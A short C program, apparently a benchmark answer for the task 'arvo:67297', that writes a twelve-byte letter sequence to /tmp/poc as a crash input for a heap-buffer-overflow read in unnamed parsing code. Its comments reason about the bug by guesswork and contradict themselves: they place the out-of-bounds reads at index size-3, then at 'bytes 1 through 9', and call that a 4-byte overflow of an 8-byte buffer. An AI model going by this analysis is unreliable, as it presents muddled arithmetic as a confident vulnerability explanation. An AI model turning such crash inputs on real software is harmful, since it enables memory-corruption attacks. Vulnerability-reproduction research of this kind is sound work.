#include <stdio.h>
#include <stdlib.h>

/* PoC for arvo:67297 */
/* Triggers: heap-buffer-overflow due to loop reading size-2 but only having size-1 elements */
/* Vulnerability class: heap_buffer_overflow */

int main(void) {
    /* We need to create an input that when processed by the vulnerable loop
       (for size_t i = 1; i < size - 2; i++) causes a read off the end of a heap buffer.
       
       The crash shows a 4-byte read at offset 0x0c from a buffer allocated at 0x6020000000b0
       (size 8, meaning only 8 bytes allocated but loop tries to read beyond).
       
       Based on the pattern and typical regex/pcre inputs, we create a pattern that
       will cause the vulnerable code to overflow a small buffer.
       
       The key is that size must be such that size - 2 causes the loop to iterate
       beyond the actual buffer boundary. With an 8-byte buffer, size should be >= 12 */
    
    /* Generate minimal payload that triggers the overflow */
    FILE *f = fopen("/tmp/poc", "wb");
    if (!f) { perror("fopen"); return 1; }
    
    /* Write a pattern that exploits the off-by-two in the loop bound.
       The vulnerable code allocates based on size but checks i < size-2,
       meaning it can read up to index size-3, which for small buffers overflows.
       We construct a buffer of exactly 8 bytes, but the loop will try to read
       bytes 1 through 9 (inclusive) from its base, overflowing by 4 bytes */
    
    for (int i = 0; i < 12; i++) {
        fputc(0x41 + (i % 26), f);  /* A-Z pattern to visualize overflow */
    }
    
    fclose(f);
    return 0;
}